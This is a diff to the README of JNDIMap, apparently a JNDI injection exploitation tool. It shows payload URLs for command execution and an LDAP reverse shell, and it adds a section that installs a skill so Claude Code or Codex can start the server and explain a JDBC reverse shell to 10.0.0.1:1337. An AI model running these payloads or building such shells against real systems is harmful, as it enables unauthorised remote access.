@@ -32,6 +32,21 @@ rmi://10.0.0.1:1099/Basic/Command/open -a Calculator
 ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 ```
 
+## 💡 Skills
+
+Using JNDIMap via Claude Code or Codex
+
+```bash
+# Install Skill
+npx skills add X1r0z/JNDIMap -g
+
+# Claude Code
+claude '/jndi-map Start the JNDIMap server and tell me how to make a JDBC reverse shell on 10.0.0.1:1337'
+
+# Codex
+codex '$jndi-map Start the JNDIMap server and tell me how to make a JDBC reverse shell on 10.0.0.1:1337'
+```
+
 ## 🚩 Features
 
 - DNSLog
